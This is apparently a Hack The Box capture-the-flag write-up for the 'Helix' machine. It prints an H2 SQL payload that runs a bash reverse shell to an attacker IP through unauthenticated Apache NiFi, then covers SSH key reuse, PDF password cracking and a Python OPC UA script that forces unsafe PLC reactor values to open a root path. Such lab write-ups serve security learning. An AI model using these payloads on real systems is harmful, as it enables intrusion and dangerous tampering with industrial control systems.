---
title: Helix - Hack The Box Writeup
date: 2026-04-29
categories: [CTF, Writeups, HTB]
tags: [htb, linux, medium, nifi, rce, ics, scada, opcua, ssh-tunneling, lateral-movement]
image:
  path: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1b8188e-fb8e-4915-b1b9-133ad9fd84e1-1778120580.png"
  description: A walkthrough of the Helix HTB machine, showcasing an unauthenticated Apache NiFi ExecuteSQL/H2 RCE, an SSH key recovered from a support bundle, and OPC UA PLC manipulation for root access.
author: daemonyrax
---

## Nmap Recon and Initial Enumeration

To begin our reconnaissance, we run an Nmap scan to identify open ports and services on the target machine:

```bash
nmap -p- -sV -sC -T4 [TARGET_IP]
```

The scan reveals Port 22 (OpenSSH 8.9p1 Ubuntu), Port 80 (Nginx HTTP), and Port 8080 (Apache NiFi 1.21.0) are open.

Virtual host enumeration turns up `flow.helix.htb`, pointing to the NiFi management interface. We add it to our `/etc/hosts` file and browse to `http://flow.helix.htb:8080/nifi`.

## Exploring the Application

The NiFi instance is exposed without any authentication — a serious misconfiguration on its own. Poking around the interface, we find that NiFi's `ExecuteSQL` processor supports multiple database backends, and the H2 Database JAR is already present on the box at `/opt/nifi-1.21.0/lib/h2-2.1.214.jar`. H2 supports Java aliases that execute arbitrary Java code, which makes it a reliable path to RCE.

We start by creating a `DBCPConnectionPool` controller service pointed at an in-memory H2 database:

```text
Database Connection URL:    jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3
Database Driver Class Name: org.h2.Driver
Database Driver Location:   /opt/nifi-1.21.0/lib/h2-2.1.214.jar
```

## Identifying Vulnerabilities

### 1. Unauthenticated NiFi ExecuteSQL + H2 Java Alias RCE

H2's `CREATE ALIAS ... EXEC` syntax lets a SQL statement define and immediately call a Java method — including one that shells out to the OS. Since NiFi will run any SQL script an `ExecuteSQL` processor is pointed at, hosting a malicious script and pulling it in via `RUNSCRIPT FROM` is enough to get code execution as the `nifi` user.

**Payload (`rce.sql`):**

```sql
CREATE ALIAS IF NOT EXISTS PWN EXEC AS $$
String pwn(String cmd) throws java.io.IOException {
    Runtime.getRuntime().exec(new String[] {"/bin/sh", "-c", cmd});
    return "pwned";
}
$$;
CALL PWN('bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"');
```

## Exploitation

We host the payload with a simple Python server:

```bash
python3 -m http.server 8000
```

Then create an `ExecuteSQL` processor pointed at our controller service, with the query set to pull and run the script:

```sql
RUNSCRIPT FROM 'http://[ATTACKER_IP]:8000/rce.sql'
```

Start a listener and trigger the processor:

```bash
nc -lvnp 4444
```

A shell comes back as `nifi`.

### Lateral Movement via a Leaked Support Bundle

The `nifi` account is a restricted service account, so we enumerate the NiFi installation for anything useful:

```bash
ls -la /opt/nifi-1.21.0/support-bundles/
```

NiFi uses this directory for diagnostics, and — as is common with diagnostic bundles — it contains something it shouldn't: `operator_id_ed25519.bak`, a private SSH key belonging to the `operator` user.

```bash
chmod 600 id_ed25519_operator
ssh -i id_ed25519_operator operator@[TARGET_IP]
```

```bash
cat ~/user.txt
```

**User flag captured.**

### Privilege Escalation via OPC UA PLC Manipulation

The operator's home directory holds a control-systems diagram and a password-protected PDF, `Operator Control & Safety Guide.pdf`. We crack it with `pdf2john` and `john` against rockyou:

```bash
pdf2john 'Operator Control & Safety Guide.pdf' > pdf_hash.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
```

The password turns out to be `operator1`. Inside, the manual documents that the privileged maintenance window opens once reactor temperature is at least 295°C, pressure is at least 73 bar, and mode is set to `MAINTENANCE`.

Checking locally bound services with `ss -tulpn` shows a web HMI on port 8081 and an OPC UA endpoint on port 4840. `sudo -l` confirms `operator` can run `/usr/local/sbin/helix-maint-console` as root with `NOPASSWD` — but the maintenance window is still closed, so we need to trigger those hazardous conditions ourselves first.

Port 4840 isn't exposed publicly, so we forward it over SSH:

```bash
ssh -L 4840:127.0.0.1:4840 operator@[TARGET_IP] -i id_ed25519_operator
```

With the port tunneled and the `opcua` library installed locally, we connect and push the PLC values past their thresholds:

```python
# root_exploit.py
from opcua import Client
import time

url = "opc.tcp://127.0.0.1:4840/helix/"
client = Client(url)

try:
    client.connect()
    print("[+] Connected to OPC UA via tunnel")

    nodes = {}
    for parent_id in ["ns=2;i=2", "ns=2;i=11"]:
        for child in client.get_node(parent_id).get_children():
            nodes[child.get_browse_name().Name] = child

    nodes["Mode"].set_value("MAINTENANCE")
    nodes["TestOverride"].set_value(True)
    nodes["CalibrationOffset"].set_value(20.0)

    print("[+] Payload injected. Hazardous condition simulated!")
    time.sleep(5)

finally:
    client.disconnect()
```

```bash
python3 root_exploit.py
```

Reactor temperature on the HMI climbs to 301.4°C, and the `Privileged Maintenance Window` state flips to **OPEN** at `http://127.0.0.1:8081`. With the window open, the sudo binary is finally usable:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

**Root flag captured.**

---

This concludes the walkthrough for the Helix HTB machine. We exploited an unauthenticated Apache NiFi instance for RCE via an H2 Java alias, recovered an SSH key from a leaked support bundle, cracked a password-protected PDF, and manipulated OPC UA node values to force open a privileged maintenance window for root. Happy hacking!
